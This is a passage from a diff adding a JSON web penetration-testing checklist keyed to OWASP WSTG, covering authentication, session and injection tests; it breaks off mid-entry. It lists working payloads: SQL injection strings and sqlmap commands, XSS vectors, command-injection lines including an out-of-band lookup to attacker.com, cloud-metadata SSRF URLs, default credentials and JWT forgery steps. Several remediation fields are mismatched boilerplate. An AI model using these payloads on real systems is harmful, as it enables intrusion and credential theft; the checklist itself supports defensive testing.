+            "Inject XSS/SQLi payloads in WebSocket message fields",
+            "Replay captured WebSocket messages in Burp \u2192 are they server-validated?",
+            "Test: connect without auth token \u2014 server should reject"
+          ],
+          "expected": "WebSocket connections require authentication. All messages validated server-side. No injection possible via WS messages.",
+          "recommendation": "Remediate according to OWASP ASVS and WSTG guidance. Validate and sanitize all user input, enforce defense-in-depth access controls, and log security events securely.",
+          "tools": [
+            "Burp Suite WebSockets",
+            "Browser DevTools",
+            "wscat"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "P3",
+      "name": "Authentication Testing",
+      "scope": "endpoint",
+      "items": [
+        {
+          "id": "WSTG-ATHN-01",
+          "name": "Credentials Over Encrypted Channel",
+          "sev": "critical",
+          "mitre_tactic": "Credential Access",
+          "mitre_technique": [
+            "T1190 - Exploit Public-Facing Application"
+          ],
+          "mitre": [
+            "Credential Access"
+          ],
+          "cwe": [
+            "CWE-319"
+          ],
+          "cvss_score": "9.8 (Critical)",
+          "how": "Verify all credential submissions are made exclusively over HTTPS, never over HTTP.",
+          "cases": [
+            "Open login page on HTTP \u2014 does it force redirect to HTTPS before form renders?",
+            "Check form ACTION attribute: points to https:// URL?",
+            "Intercept login POST in Burp \u2014 TLS-encrypted connection used?",
+            "Check password reset form submission \u2014 HTTPS only?",
+            "Test API auth endpoints over HTTP \u2014 rejected?",
+            "HSTS header on login domain: Strict-Transport-Security present and correct?",
+            "Check all API endpoints: Bearer token sent over HTTP anywhere?"
+          ],
+          "expected": "All credential submissions over HTTPS only. HTTP redirects before form action. HSTS present with max-age >= 31536000.",
+          "recommendation": "Remediate according to OWASP ASVS and WSTG guidance. Validate and sanitize all user input, enforce defense-in-depth access controls, and log security events securely.",
+          "tools": [
+            "Burp Suite",
+            "Browser address bar",
+            "curl"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "WSTG-ATHN-02",
+          "name": "Default Credentials Testing",
+          "sev": "critical",
+          "mitre_tactic": "Credential Access",
+          "mitre_technique": [
+            "T1078 - Standard Technique"
+          ],
+          "mitre": [
+            "T1078"
+          ],
+          "cwe": [
+            "CWE-1392"
+          ],
+          "cvss_score": "9.8 (Critical)",
+          "how": "Test all login and management interfaces for commonly known default credentials.",
+          "cases": [
+            "Try: admin/admin, admin/password, admin/123456, admin/[blank], admin/admin123",
+            "Try: administrator/administrator, sa/sa (MSSQL), test/test, guest/guest",
+            "Check management portals if accessible: IIS Manager, MSSQL SA, phpMyAdmin",
+            "Shodan: check if target services have known default creds",
+            "Check system-generated accounts (installer accounts, service accounts)",
+            "Try: company name as both username and password",
+            "Try first name / last name combinations from LinkedIn staff enumeration"
+          ],
+          "expected": "No default credentials accepted on any login interface. All accounts have unique strong passwords.",
+          "recommendation": "Remediate according to OWASP ASVS and WSTG guidance. Validate and sanitize all user input, enforce defense-in-depth access controls, and log security events securely.",
+          "tools": [
+            "Burp Intruder",
+            "Hydra",
+            "SecLists default credentials list"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "WSTG-ATHN-03",
+          "name": "Account Lockout & Rate Limiting",
+          "sev": "high",
+          "mitre_tactic": "Credential Access",
+          "mitre_technique": [
+            "T1110 - Standard Technique"
+          ],
+          "mitre": [
+            "T1110"
+          ],
+          "cwe": [
+            "CWE-307"
+          ],
+          "cvss_score": "8.5 (High)",
+          "how": "Test whether the application enforces account lockout or rate limiting after repeated failed attempts.",
+          "cases": [
+            "Submit 10+ failed login attempts for same account \u2014 lockout or rate limit?",
+            "Test lockout bypass: X-Forwarded-For: 1.2.3.4 \u2192 1.2.3.5 \u2192 1.2.3.6 header rotation",
+            "Test lockout bypass: X-Real-IP, X-Originating-IP, CF-Connecting-IP header spoofing",
+            "Distribute attempts over time (1 per minute) \u2014 lockout still applies?",
+            "Test: does lockout apply to password reset too?",
+            "Test: does lockout apply to OTP/MFA entry page?",
+            "Check lockout duration \u2014 too short (30 seconds) = ineffective"
+          ],
+          "expected": "Lockout after 5-10 failed attempts OR rate limiting enforced. Lockout cannot be bypassed via IP header spoofing.",
+          "recommendation": "Avoid passing user input to system shells. Use native language APIs with explicit parameter lists instead of shell command execution.",
+          "tools": [
+            "Burp Intruder",
+            "Hydra",
+            "Manual"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "WSTG-ATHN-04",
+          "name": "Authentication Bypass",
+          "sev": "critical",
+          "mitre_tactic": "Credential Access",
+          "mitre_technique": [
+            "T1078 - Standard Technique"
+          ],
+          "mitre": [
+            "T1078"
+          ],
+          "cwe": [
+            "CWE-287"
+          ],
+          "cvss_score": "9.8 (Critical)",
+          "how": "Attempt to bypass the authentication mechanism using SQL injection, forced browsing, and response manipulation.",
+          "cases": [
+            "SQL injection in login: admin'-- in username field",
+            "' OR '1'='1' -- in password field with any username",
+            "Navigate directly to /dashboard, /admin, /profile without any session",
+            "Intercept login 302 redirect: change response to 200 OK \u2192 does page render?",
+            "Add URL params: ?debug=true, ?admin=1, ?authenticated=true, ?bypass=1",
+            "Test login with empty username AND empty password",
+            "SAML response manipulation if SSO used: change NameID or role attribute",
+            "Try null bytes: username=admin%00' in login fields"
+          ],
+          "expected": "No authentication bypass possible. Direct URL access to authenticated pages redirects to login.",
+          "recommendation": "Use parameterized queries (PreparedStatements / ORMs) for all database access. Never concatenate user input directly into SQL strings. Enforce database user least privilege.",
+          "tools": [
+            "Burp Suite Repeater",
+            "sqlmap",
+            "Manual"
+          ],
+          "command_template": "sqlmap -u \"{{URL}}\" --batch --random-agent --banner",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "WSTG-ATHN-07",
+          "name": "Password Policy Testing",
+          "sev": "medium",
+          "mitre_tactic": "Credential Access",
+          "mitre_technique": [
+            "T1190 - Exploit Public-Facing Application"
+          ],
+          "mitre": [
+            "Credential Access"
+          ],
+          "cwe": [
+            "CWE-521"
+          ],
+          "cvss_score": "6.5 (Medium)",
+          "how": "Test password policy enforcement at registration, password change, and password reset.",
+          "cases": [
+            "Register with: a (1 char \u2014 too short)",
+            "Register with: 12345678 (numeric only)",
+            "Register with: password (dictionary word)",
+            "Register with: aaaaaaaa (all same character)",
+            "Register with: Password1 (minimal complexity \u2014 should fail if policy strong)",
+            "Check minimum length enforced (should be >= 12 chars)",
+            "Check if common/breached passwords rejected: haveibeenpwned API integration?",
+            "Test if username cannot be used as password",
+            "Test same policy on: registration + password change + password reset forms"
+          ],
+          "expected": "Minimum 12 characters with complexity (upper, lower, digit, symbol). Common/breached passwords rejected.",
+          "recommendation": "Avoid passing user input to system shells. Use native language APIs with explicit parameter lists instead of shell command execution.",
+          "tools": [
+            "Browser",
+            "Burp Repeater"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "WSTG-ATHN-09",
+          "name": "Password Reset Functionality",
+          "sev": "high",
+          "mitre_tactic": "Credential Access",
+          "mitre_technique": [
+            "T1078 - Standard Technique"
+          ],
+          "mitre": [
+            "T1078"
+          ],
+          "cwe": [
+            "CWE-640"
+          ],
+          "cvss_score": "8.5 (High)",
+          "how": "Test the password reset flow for token security, expiry, reuse, enumeration, and host header injection.",
+          "cases": [
+            "Request reset \u2192 analyze email token: length, character set, entropy",
+            "Request 2 resets in sequence \u2014 are tokens sequential or predictable?",
+            "Test token expiry: use a 2-hour-old token \u2192 must fail",
+            "Test single-use: consume token, then use it again \u2192 must fail",
+            "Host header injection: change Host: attacker.com \u2192 check if reset link uses attacker domain",
+            "Test: X-Forwarded-Host: attacker.com same as above",
+            "Email enumeration: does \"email sent\" confirm account exists?",
+            "Reset link still valid after victim changes password? (Should be invalidated)",
+            "Security question bypass if used: try common answers, SQL injection in answer field"
+          ],
+          "expected": "Tokens are random (>=128 bits entropy), single-use, expire <=30 min. Host header not reflected in reset emails.",
+          "recommendation": "Implement standard HTTP security headers: Strict-Transport-Security (HSTS), X-Content-Type-Options: nosniff, Referrer-Policy, and a robust Content-Security-Policy.",
+          "tools": [
+            "Burp Repeater",
+            "Email client"
+          ],
+          "command_template": "curl -ik -I -X GET \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "WSTG-ATHN-11",
+          "name": "Multi-Factor Authentication (MFA) Testing",
+          "sev": "high",
+          "mitre_tactic": "Credential Access",
+          "mitre_technique": [
+            "T1078 - Standard Technique"
+          ],
+          "mitre": [
+            "T1078"
+          ],
+          "cwe": [
+            "CWE-308"
+          ],
+          "cvss_score": "8.5 (High)",
+          "how": "Test MFA implementation for bypass, OTP brute force, code reuse, and step-skipping.",
+          "cases": [
+            "After login step 1: navigate directly to post-MFA URL \u2014 works without MFA?",
+            "Try submitting expired OTP codes (>30 seconds old)",
+            "OTP brute force on MFA page: does rate limiting / lockout apply? (000000\u2192999999)",
+            "Submit empty OTP code \u2014 does server accept it?",
+            "Can MFA be disabled without re-authentication?",
+            "Backup codes: are they single-use? Sufficient entropy (>=8 chars)?",
+            "TOTP time window: does server accept codes from 5+ minutes ago?",
+            "Test account recovery: can recovery bypass MFA entirely?"
+          ],
+          "expected": "MFA cannot be skipped. OTPs expire after 30s. Brute force protection on OTP page. Recovery flow also requires strong verification.",
+          "recommendation": "Avoid passing user input to system shells. Use native language APIs with explicit parameter lists instead of shell command execution.",
+          "tools": [
+            "Burp Suite",
+            "Manual"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "WSTG-IDNT-04",
+          "name": "Account Enumeration",
+          "sev": "medium",
+          "mitre_tactic": "Credential Access",
+          "mitre_technique": [
+            "T1589 - Standard Technique"
+          ],
+          "mitre": [
+            "T1589"
+          ],
+          "cwe": [
+            "CWE-204"
+          ],
+          "cvss_score": "6.5 (Medium)",
+          "how": "Test login, registration, and password reset flows for differences revealing valid account existence.",
+          "cases": [
+            "Login: compare exact error text for valid vs invalid username",
+            "Login: measure response TIME for valid vs invalid username (timing oracle)",
+            "Password reset: does it confirm \"email sent\" only for valid emails?",
+            "Registration: does it say \"email already registered\" vs \"registered successfully\"?",
+            "Burp Intruder: send username list \u2192 compare response sizes/codes",
+            "API: test /api/users/check-email or /api/register endpoint",
+            "API: test /users/{username} \u2014 does 404 vs 403 reveal existence?"
+          ],
+          "expected": "Identical generic responses and response times for valid/invalid accounts. No account enumeration possible.",
+          "recommendation": "Remediate according to OWASP ASVS and WSTG guidance. Validate and sanitize all user input, enforce defense-in-depth access controls, and log security events securely.",
+          "tools": [
+            "Burp Intruder",
+            "Manual comparison"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "WSTG-SESS-01",
+          "name": "Session Token Analysis",
+          "sev": "high",
+          "mitre_tactic": "Credential Access",
+          "mitre_technique": [
+            "T1190 - Exploit Public-Facing Application"
+          ],
+          "mitre": [
+            "Credential Access"
+          ],
+          "cwe": [
+            "CWE-330"
+          ],
+          "cvss_score": "8.5 (High)",
+          "how": "Analyze session token randomness, encoding, predictability, and information disclosure.",
+          "cases": [
+            "Collect 10+ session tokens by logging in/out repeatedly",
+            "Burp \u2192 Sequencer \u2192 load tokens \u2192 run full analysis \u2192 check FIPS pass/fail",
+            "Decode tokens: is it Base64? JWT? Custom encoding? Timestamp-based?",
+            "Does token contain user ID, role, or timestamp in plaintext?",
+            "Token length: should be >= 128 bits (32 hex chars minimum)",
+            "Change one character in token \u2192 does session remain valid? (It should not)",
+            "ASP.NET_SessionId: 24-char Base64 = 128-bit random? Run through Sequencer"
+          ],
+          "expected": "Tokens pass Burp Sequencer FIPS analysis. No predictable pattern. No user data embedded. >=128 bits entropy.",
+          "recommendation": "Set Secure, HttpOnly, and SameSite=Lax/Strict flags on all session cookies. Regenerate session identifiers upon authentication and implement idle and absolute session timeouts.",
+          "tools": [
+            "Burp Sequencer",
+            "jwt.io",
+            "Burp Decoder"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "WSTG-SESS-02",
+          "name": "Cookie Security Attributes",
+          "sev": "high",
+          "mitre_tactic": "Credential Access",
+          "mitre_technique": [
+            "T1190 - Exploit Public-Facing Application"
+          ],
+          "mitre": [
+            "Credential Access"
+          ],
+          "cwe": [
+            "CWE-614",
+            "CWE-1004"
+          ],
+          "cvss_score": "8.5 (High)",
+          "how": "Inspect all session and auth cookies for Secure, HttpOnly, SameSite, Domain, and Path attributes.",
+          "cases": [
+            "Browser DevTools \u2192 Application \u2192 Cookies \u2192 inspect EVERY cookie",
+            "Burp: check all Set-Cookie response headers during browsing",
+            "Missing Secure flag: session cookie transmittable over HTTP \u2192 session hijacking",
+            "Missing HttpOnly: JavaScript can read cookie \u2192 XSS leads to session theft",
+            "SameSite=None without Secure: CSRF risk",
+            "SameSite not set: defaults to browser behavior (risky on older browsers)",
+            "Domain attribute too broad: .target.com allows all subdomains \u2192 subdomain XSS risk",
+            ".NET: check ASP.NET_SessionId, .ASPXAUTH, .ASPXROLES, __RequestVerificationToken"
+          ],
+          "expected": "All session cookies: Secure=true, HttpOnly=true, SameSite=Strict or Lax. Minimal Domain/Path scope.",
+          "recommendation": "Set Secure, HttpOnly, and SameSite=Lax/Strict flags on all session cookies. Regenerate session identifiers upon authentication and implement idle and absolute session timeouts.",
+          "tools": [
+            "Browser DevTools",
+            "Burp Suite"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "WSTG-SESS-03",
+          "name": "Session Fixation",
+          "sev": "high",
+          "mitre_tactic": "Credential Access",
+          "mitre_technique": [
+            "T1190 - Exploit Public-Facing Application"
+          ],
+          "mitre": [
+            "Credential Access"
+          ],
+          "cwe": [
+            "CWE-384"
+          ],
+          "cvss_score": "8.5 (High)",
+          "how": "Test if the application regenerates the session token after successful authentication.",
+          "cases": [
+            "Capture session token BEFORE login (unauthenticated request gets cookie)",
+            "Complete the login process",
+            "Compare session cookie value BEFORE and AFTER login \u2014 must be DIFFERENT",
+            "If same token used before and after login = session fixation vulnerability",
+            "Test: manually set a custom session cookie value before login \u2192 accepted post-auth?",
+            "Test: does token change after MFA completion (second auth step)?",
+            "Test: does token change after privilege change (e.g. user becomes admin)?"
+          ],
+          "expected": "Session token regenerated on authentication. Pre-auth token invalidated after successful login.",
+          "recommendation": "Set Secure, HttpOnly, and SameSite=Lax/Strict flags on all session cookies. Regenerate session identifiers upon authentication and implement idle and absolute session timeouts.",
+          "tools": [
+            "Burp Suite",
+            "Browser DevTools"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "WSTG-SESS-06",
+          "name": "Logout & Session Invalidation",
+          "sev": "medium",
+          "mitre_tactic": "Credential Access",
+          "mitre_technique": [
+            "T1190 - Exploit Public-Facing Application"
+          ],
+          "mitre": [
+            "Credential Access"
+          ],
+          "cwe": [
+            "CWE-613"
+          ],
+          "cvss_score": "6.5 (Medium)",
+          "how": "Test that logout invalidates the server-side session and that old tokens cannot be reused.",
+          "cases": [
+            "Log in \u2192 copy session cookie \u2192 log out \u2192 replay old cookie in Burp Repeater",
+            "Old cookie must return 401 or redirect to login, NOT serve authenticated content",
+            "Test logout from all devices/sessions option (if available)",
+            "JWT after logout: token still validates? (Server must blacklist or use short-lived tokens)",
+            "Test session expiry: wait beyond session timeout \u2192 old cookie still works?",
+            "Test: refresh access token after logout \u2192 should fail"
+          ],
+          "expected": "Session token invalidated server-side on logout. Old tokens return 401. JWT tokens added to server denylist or short-lived (<15min).",
+          "recommendation": "Set Secure, HttpOnly, and SameSite=Lax/Strict flags on all session cookies. Regenerate session identifiers upon authentication and implement idle and absolute session timeouts.",
+          "tools": [
+            "Burp Repeater"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "WSTG-SESS-10",
+          "name": "JWT Testing",
+          "sev": "critical",
+          "mitre_tactic": "Credential Access",
+          "mitre_technique": [
+            "T1078 - Standard Technique"
+          ],
+          "mitre": [
+            "T1078"
+          ],
+          "cwe": [
+            "CWE-347"
+          ],
+          "cvss_score": "9.8 (Critical)",
+          "how": "Test JWT implementation for algorithm confusion, weak secrets, claim manipulation, and missing validation.",
+          "cases": [
+            "Decode at jwt.io \u2192 inspect header algorithm and payload claims",
+            "alg:none attack: change \"alg\":\"HS256\" \u2192 \"alg\":\"none\", remove signature \u2192 submit",
+            "Change payload claims: role:user \u2192 role:admin, isAdmin:false \u2192 isAdmin:true",
+            "RS256\u2192HS256 confusion: sign token with server public key as HMAC secret",
+            "Brute force weak secret: hashcat -a 0 -m 16500 token.txt rockyou.txt",
+            "jwt_tool -T token.txt \u2014 automated JWT attacks (tamper all options)",
+            "Expired token (exp claim in past): server should reject",
+            "kid header injection: \"kid\":\"../../appsettings.json\" \u2192 path traversal in key lookup",
+            "Null signature: submit token with empty signature field"
+          ],
+          "expected": "JWT uses RS256 or ES256. alg:none rejected. Claims cannot be tampered. Expired tokens rejected. No weak HMAC secret.",
+          "recommendation": "Remediate according to OWASP ASVS and WSTG guidance. Validate and sanitize all user input, enforce defense-in-depth access controls, and log security events securely.",
+          "tools": [
+            "jwt.io",
+            "jwt_tool",
+            "hashcat",
+            "Burp JWT Editor extension"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        }
+      ]
+    },
+    {
+      "id": "P4",
+      "name": "Injection Testing",
+      "scope": "endpoint",
+      "items": [
+        {
+          "id": "WSTG-INPV-05",
+          "name": "SQL Injection",
+          "sev": "critical",
+          "mitre_tactic": "Privilege Escalation",
+          "mitre_technique": [
+            "T1190 - Standard Technique"
+          ],
+          "mitre": [
+            "T1190"
+          ],
+          "cwe": [
+            "CWE-89"
+          ],
+          "cvss_score": "9.8 (Critical)",
+          "how": "Test all input parameters for SQL injection using manual probes, blind techniques, and automated tools. Test EVERY vector.",
+          "cases": [
+            "Add ' to every input field \u2192 look for DB errors (Incorrect syntax near..., ORA-, MySQL error)",
+            "Error-based: ' ORDER BY 100-- (reveals column count via error)",
+            "Boolean: ' AND 1=1-- (true response) vs ' AND 1=2-- (false) \u2192 compare content/length",
+            "MSSQL time-based: '; WAITFOR DELAY '0:0:5'-- (5 second delay)",
+            "MySQL time-based: ' AND SLEEP(5)--",
+            "Test ALL vectors: URL params, POST body, cookies, headers (User-Agent, Referer, X-Forwarded-For)",
+            "sqlmap -u 'https://target.com/page?id=1' --batch --dbs --level=3 --risk=2",
+            "sqlmap POST: sqlmap -u URL --data='param=value&id=1' --batch",
+            "Out-of-band: sqlmap --technique=E (DNS exfil via xp_dirtree)",
+            "Second-order SQLi: inject payload that executes when data is used later"
+          ],
+          "expected": "No SQL injection. Parameterized queries/ORM used throughout. All errors generic (no DB-specific messages).",
+          "recommendation": "Use parameterized queries (PreparedStatements / ORMs) for all database access. Never concatenate user input directly into SQL strings. Enforce database user least privilege.",
+          "tools": [
+            "sqlmap",
+            "Burp Intruder",
+            "OWASP ZAP Active Scan",
+            "Manual"
+          ],
+          "command_template": "sqlmap -u \"{{URL}}\" --batch --random-agent --banner",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "WSTG-INPV-01",
+          "name": "Reflected XSS",
+          "sev": "high",
+          "mitre_tactic": "Privilege Escalation",
+          "mitre_technique": [
+            "T1190 - Standard Technique"
+          ],
+          "mitre": [
+            "T1190"
+          ],
+          "cwe": [
+            "CWE-79"
+          ],
+          "cvss_score": "8.5 (High)",
+          "how": "Inject XSS payloads into all reflected inputs: URL params, search, error messages, header-reflected values.",
+          "cases": [
+            "<script>alert(1)</script> in every GET/POST param",
+            "\"><img src=x onerror=alert(1)> \u2014 attribute context breakout",
+            "<svg onload=alert(1)> \u2014 HTML5 SVG vector",
+            "javascript:alert(1) \u2014 href/src attribute injection",
+            "Case bypass: <ScRiPt>alert(1)</ScRiPt>",
+            "Double encoding: %253Cscript%253Ealert(1)%253C/script%253E",
+            "Test reflected HTTP headers: Referer, User-Agent, Accept-Language headers",
+            ".NET Request Validation bypass: %00<script>alert(1)</script>",
+            "XSStrike: xsstrike.py -u \"https://target.com/search?q=test\""
+          ],
+          "expected": "All user input HTML-encoded before reflection. CSP without unsafe-inline. No XSS payload executes.",
+          "recommendation": "Apply contextual output encoding (HTML, JavaScript, Attribute context) before rendering untrusted input. Enforce a strong Content-Security-Policy (CSP) with nonce or hash-based script execution.",
+          "tools": [
+            "Burp Suite",
+            "OWASP ZAP",
+            "XSStrike",
+            "Manual"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\" -H \"User-Agent: Pentest/1.0\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "WSTG-INPV-02",
+          "name": "Stored XSS",
+          "sev": "high",
+          "mitre_tactic": "Privilege Escalation",
+          "mitre_technique": [
+            "T1190 - Standard Technique"
+          ],
+          "mitre": [
+            "T1190"
+          ],
+          "cwe": [
+            "CWE-79"
+          ],
+          "cvss_score": "8.5 (High)",
+          "how": "Inject XSS into persistent fields and verify execution when rendered to other users or admins.",
+          "cases": [
+            "Store <script>alert(document.cookie)</script> in comment/note/bio fields",
+            "Store XSS in username/display name \u2192 fires when admin views user list",
+            "Store XSS in address, support ticket, shipping notes, feedback fields",
+            "Store XSS in fields shown in admin panel: user agent, IP, referrer logs",
+            "SVG file upload: <svg><script>alert(document.domain)</script></svg>",
+            "Stored XSS in email field if shown in admin UI: <script>...</script>@test.com",
+            "Test all user-controlled data that is later displayed to other users"
+          ],
+          "expected": "All stored input HTML-encoded before rendering. Stored XSS cannot execute in any context.",
+          "recommendation": "Apply contextual output encoding (HTML, JavaScript, Attribute context) before rendering untrusted input. Enforce a strong Content-Security-Policy (CSP) with nonce or hash-based script execution.",
+          "tools": [
+            "Burp Suite",
+            "Manual"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\" -H \"User-Agent: Pentest/1.0\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "WSTG-CLNT-01",
+          "name": "DOM-Based XSS",
+          "sev": "high",
+          "mitre_tactic": "Privilege Escalation",
+          "mitre_technique": [
+            "T1190 - Standard Technique"
+          ],
+          "mitre": [
+            "T1190"
+          ],
+          "cwe": [
+            "CWE-79"
+          ],
+          "cvss_score": "8.5 (High)",
+          "how": "Inspect JavaScript for dangerous sinks receiving user-controlled data without sanitization.",
+          "cases": [
+            "Search JS for dangerous sinks: document.write, innerHTML, outerHTML, eval, setTimeout(str)",
+            "Search JS for sources: location.hash, location.search, location.href, document.URL, document.referrer",
+            "Test URL fragment: https://target.com/page#\"><img src=x onerror=alert(1)>",
+            "Test search param flowing to innerHTML: ?name=<img src=x onerror=alert(1)>",
+            "postMessage handlers: send crafted message to window \u2192 XSS in handler?",
+            "DevTools \u2192 Sources \u2192 search for innerHTML = | document.write( | eval("
+          ],
+          "expected": "No dangerous sinks receive unsanitized user input. textContent used over innerHTML. DOMPurify used if HTML needed.",
+          "recommendation": "Apply contextual output encoding (HTML, JavaScript, Attribute context) before rendering untrusted input. Enforce a strong Content-Security-Policy (CSP) with nonce or hash-based script execution.",
+          "tools": [
+            "Browser DevTools",
+            "Burp Suite",
+            "Manual source-to-sink tracing"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\" -H \"User-Agent: Pentest/1.0\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "WSTG-INPV-12",
+          "name": "OS Command Injection",
+          "sev": "critical",
+          "mitre_tactic": "Privilege Escalation",
+          "mitre_technique": [
+            "T1059 - Standard Technique"
+          ],
+          "mitre": [
+            "T1059"
+          ],
+          "cwe": [
+            "CWE-78"
+          ],
+          "cvss_score": "9.8 (Critical)",
+          "how": "Test inputs that may reach OS commands: file names, IP fields, ping, DNS lookup, hostnames, scheduler.",
+          "cases": [
+            "Windows: & whoami | whoami ; whoami || whoami && whoami",
+            "Linux: ; id | id && id `id` $(id)",
+            "Blind Windows: & ping -n 5 127.0.0.1 (5-second delay = blind CMDi)",
+            "Blind Linux: ; sleep 5",
+            "OOB: ; nslookup $(whoami).attacker.com (use interactsh)",
+            "commix --url \"https://target.com/?field=INJECT_HERE\" --batch",
+            "Test ALL potentially OS-touching inputs: filename, hostname, IP, port, search, email subject, scheduler, report gen"
+          ],
+          "expected": "No OS command injection. User input never reaches system() / Process.Start(). Whitelist validation on OS-touching fields.",
+          "recommendation": "Avoid passing user input to system shells. Use native language APIs with explicit parameter lists instead of shell command execution.",
+          "tools": [
+            "Burp Suite",
+            "commix",
+            "interactsh",
+            "Manual"
+          ],
+          "command_template": "nmap -sV -sC -Pn -p {{PORT}} {{HOST}}",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "WSTG-INPV-18",
+          "name": "Server-Side Template Injection (SSTI)",
+          "sev": "critical",
+          "mitre_tactic": "Privilege Escalation",
+          "mitre_technique": [
+            "T1190 - Standard Technique"
+          ],
+          "mitre": [
+            "T1190"
+          ],
+          "cwe": [
+            "CWE-94"
+          ],
+          "cvss_score": "9.8 (Critical)",
+          "how": "Test template engine injection by injecting mathematical expressions that template engines evaluate.",
+          "cases": [
+            "{{7*7}} \u2192 if 49 in response: Jinja2 / Twig / Pebble",
+            "${7*7} \u2192 Java Freemarker / Velocity",
+            "<%= 7*7 %> \u2192 Ruby ERB",
+            "@(7*7) \u2192 .NET Razor template",
+            "#{7*7} \u2192 Thymeleaf (Java)",
+            "{{7*'7'}} \u2192 Twig differentiation (returns 7777777)",
+            "tplmap --url \"https://target.com/page?name=test\" \u2014 automated detection",
+            "Test ALL reflected inputs: name, subject, email body, template name, search, greeting"
+          ],
+          "expected": "Template expressions not evaluated. Input treated as literal string. No template engine processes user input.",
+          "recommendation": "Remediate according to OWASP ASVS and WSTG guidance. Validate and sanitize all user input, enforce defense-in-depth access controls, and log security events securely.",
+          "tools": [
+            "tplmap",
+            "Burp Suite",
+            "Manual"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "WSTG-INPV-19",
+          "name": "Server-Side Request Forgery (SSRF)",
+          "sev": "critical",
+          "mitre_tactic": "Privilege Escalation",
+          "mitre_technique": [
+            "T1090 - Standard Technique"
+          ],
+          "mitre": [
+            "T1090"
+          ],
+          "cwe": [
+            "CWE-918"
+          ],
+          "cvss_score": "9.8 (Critical)",
+          "how": "Test URL-accepting inputs to redirect server-side fetches to internal resources and cloud metadata.",
+          "cases": [
+            "Identify URL inputs: webhooks, image-by-URL, doc import, PDF gen, SSO callbacks, fetch-from-URL",
+            "Try: http://127.0.0.1 | http://localhost | http://[::1] (IPv6 loopback)",
+            "AWS metadata: http://169.254.169.254/latest/meta-data/iam/security-credentials/",
+            "GCP metadata: http://metadata.google.internal/computeMetadata/v1/",
+            "Azure metadata: http://169.254.169.254/metadata/instance?api-version=2021-02-01",
+            "Decimal IP bypass: http://2130706433 (= 127.0.0.1)",
+            "URL redirect chain: use open redirect on trusted domain",
+            "OOB SSRF: use interactsh URL in all URL-accepting fields",
+            ".NET NTLM leak via UNC: \\\\attacker.com\\share\\ (SMB-based SSRF)"
+          ],
+          "expected": "URL params validated against strict allowlist. Internal addresses blocked. Cloud metadata unreachable from web tier.",
+          "recommendation": "Implement strict allowlist-based URL validation. Disable HTTP redirections on server-side requests and block requests targeting RFC 1918 private IP ranges and cloud metadata endpoints (169.254.169.254).",
+          "tools": [
+            "Burp Collaborator",
+            "interactsh",
+            "Manual"
+          ],
+          "command_template": "curl -ik -X {{METHOD}} \"{{URL}}\" -H \"X-Forwarded-For: 127.0.0.1\"",
+          "references": [
+            "https://owasp.org/www-project-web-security-testing-guide/v42/"
+          ]
+        },
+        {
+          "id": "WSTG-INPV-07",
+          "name": "XML External Entity (XXE) Injection",
+          "sev": "critical",
+          "mitre_tactic": "Privilege Escalation",
+          "mitre_technique": [
+            "T1190 - Standard Technique"
+          ],
+          "mitre": [
+            "T1190"
+          ],
+          "cwe": [
+            "CWE-611"
+          ],
+          "cvss_score": "9.8 (Critical)",
+          "how": "Inject malicious XML with external entity declarations into any XML-accepting input.",
+          "cases": [
